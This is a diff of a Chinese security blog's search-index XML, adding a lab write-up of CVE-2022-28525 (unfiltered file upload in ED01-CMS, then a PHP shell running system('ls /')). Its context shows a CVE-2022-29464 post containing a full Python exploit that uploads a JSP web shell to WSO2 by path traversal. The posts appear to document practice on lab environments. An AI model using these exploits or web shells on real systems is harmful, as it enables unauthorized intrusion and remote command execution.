@@ -4397,7 +4397,29 @@
   <entry>
     <title>CVE-2022-28525</title>
     <url>/2022/10/11/CVE-2022-28525/</url>
-    <content><![CDATA[]]></content>
+    <content><![CDATA[<!--toc-->
+<p>春蚕到死丝方尽，蜡炬成灰泪始干。</p>
+<span id="more"></span>
+<h3 id="lou-dong-miao-shu"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述<a href="#lou-dong-miao-shu" class="header-anchor">#</a></h3><p>ED01-CMS v20180505被发现存在一个任意文件上传漏洞，漏洞点位于<code>/admin/users.php?source=edit_user&amp;id=1</code>。</p>
+<h3 id="lou-dong-fen-xi"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析<a href="#lou-dong-fen-xi" class="header-anchor">#</a></h3><p>这个漏洞我没有找到现成的POC或者EXP。其实也没什么好分析的，无过滤文件上传，直接upload一个shell.php。</p>
+<h3 id="lou-dong-li-yong"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用<a href="#lou-dong-li-yong" class="header-anchor">#</a></h3><p>地址：<a href="https://yunjing.ichunqiu.com/cve/detail/1017?type=1&amp;pay=2">https://yunjing.ichunqiu.com/cve/detail/1017?type=1&amp;pay=2</a></p>
+<p>开启环境之后访问如下URL：</p>
+<p><a href="http://eci-2ze5kq310ps6x1kc5t2l.cloudeci1.ichunqiu.com/admin/users.php?source=edit_user&amp;id=1">http://eci-2ze5kq310ps6x1kc5t2l.cloudeci1.ichunqiu.com/admin/users.php?source=edit_user&amp;id=1</a></p>
+<p>随便输入两个密码：</p>
+<p><img src="/images/image-20221011140038800.png" alt="image-20221011140038800"></p>
+<p>之后burp抓包试试</p>
+<p><img src="/images/image-20221011140103051.png" alt="image-20221011140103051"></p>
+<p>直接访问：<a href="http://eci-2ze5kq310ps6x1kc5t2l.cloudeci1.ichunqiu.com/images/shell.php并post传参">http://eci-2ze5kq310ps6x1kc5t2l.cloudeci1.ichunqiu.com/images/shell.php并post传参</a></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1=system(&#x27;ls /&#x27;);</span><br></pre></td></tr></table></figure>
+<p><img src="/images/image-20221011140402596.png" alt="image-20221011140402596"></p>
+<h3 id="zong-jie"><a href="#总结" class="headerlink" title="总结"></a>总结<a href="#zong-jie" class="header-anchor">#</a></h3><h3 id="yin-yong"><a href="#引用" class="headerlink" title="引用"></a>引用<a href="#yin-yong" class="header-anchor">#</a></h3><p><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-28525">NVD - CVE-2022-28525 (nist.gov)</a></p>
+]]></content>
+      <categories>
+        <category>CVE</category>
+      </categories>
+      <tags>
+        <tag>任意文件上传</tag>
+      </tags>
   </entry>
   <entry>
     <title>CVE-2022-30887</title>
@@ -4544,8 +4566,8 @@
 <p>前面铺垫那么久，直接使用exploit.py一把梭</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#py3 exploit.py</span></span><br><span class="line"><span class="keyword">import</span> requests, urllib3, sys</span><br><span class="line"></span><br><span class="line">urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) != <span class="number">3</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Usage: python3 <span class="subst">&#123;sys.argv[<span class="number">0</span>]&#125;</span> https://host shell.jsp&quot;</span>)</span><br><span class="line">    exit()</span><br><span class="line"></span><br><span class="line">host, file = sys.argv[<span class="number">1</span>:]</span><br><span class="line">shell = <span class="string">&quot;&quot;&quot;&lt;FORM&gt;</span></span><br><span class="line"><span class="string">    &lt;INPUT name=&#x27;cmd&#x27; type=text&gt;</span></span><br><span class="line"><span class="string">    &lt;INPUT type=submit value=&#x27;Run&#x27;&gt;</span></span><br><span class="line"><span class="string">&lt;/FORM&gt;</span></span><br><span class="line"><span class="string">&lt;%@ page import=&quot;java.io.*&quot; %&gt;</span></span><br><span class="line"><span class="string">    &lt;%</span></span><br><span class="line"><span class="string">    String cmd = request.getParameter(&quot;cmd&quot;);</span></span><br><span class="line"><span class="string">    String output = &quot;&quot;;</span></span><br><span class="line"><span class="string">    if(cmd != null) &#123;</span></span><br><span class="line"><span class="string">        String s = null;</span></span><br><span class="line"><span class="string">        try &#123;</span></span><br><span class="line"><span class="string">            Process p = Runtime.getRuntime().exec(cmd,null,null);</span></span><br><span class="line"><span class="string">            BufferedReader sI = new BufferedReader(new</span></span><br><span class="line"><span class="string">InputStreamReader(p.getInputStream()));</span></span><br><span class="line"><span class="string">            while((s = sI.readLine()) != null) &#123; output += s+&quot;&lt;/br&gt;&quot;; &#125;</span></span><br><span class="line"><span class="string">        &#125;  catch(IOException e) &#123;   e.printStackTrace();   &#125;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">%&gt;</span></span><br><span class="line"><span class="string">        &lt;pre&gt;&lt;%=output %&gt;&lt;/pre&gt;&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">files = &#123;<span class="string">f&quot;../../../../repository/deployment/server/webapps/authenticationendpoint/<span class="subst">&#123;file&#125;</span>&quot;</span>: shell&#125;</span><br><span class="line">response = requests.post(<span class="string">f&#x27;<span class="subst">&#123;host&#125;</span>/fileupload/toolsAny&#x27;</span>, files=files, verify=<span class="literal">False</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;shell @ <span class="subst">&#123;host&#125;</span>/authenticationendpoint/<span class="subst">&#123;file&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python exploit.py https://eci-2zeavllmrqi5oh8hmdj2.cloudeci1.ichunqiu.com:9443 sheel.jsp</span><br></pre></td></tr></table></figure>
-<p><img src="../images/image-20221011110054901.png" alt="image-20221011110054901"></p>
-<p><img src="../images/image-20221011110109003.png" alt="image-20221011110109003"></p>
+<p><img src="/images/image-20221011110054901.png" alt="image-20221011110054901"></p>
+<p><img src="/images/image-20221011110109003.png" alt="image-20221011110109003"></p>
 <h3 id="zong-jie"><a href="#总结" class="headerlink" title="总结"></a>总结<a href="#zong-jie" class="header-anchor">#</a></h3><h3 id="yin-yong"><a href="#引用" class="headerlink" title="引用"></a>引用<a href="#yin-yong" class="header-anchor">#</a></h3><p><a href="https://packetstormsecurity.com/files/166921/WSO-Arbitrary-File-Upload-Remote-Code-Execution.html（metasploit版本）">https://packetstormsecurity.com/files/166921/WSO-Arbitrary-File-Upload-Remote-Code-Execution.html（metasploit版本）</a></p>
 <p><a href="https://github.com/hakivvi/CVE-2022-29464（详细分析版本）">https://github.com/hakivvi/CVE-2022-29464（详细分析版本）</a></p>
 ]]></content>
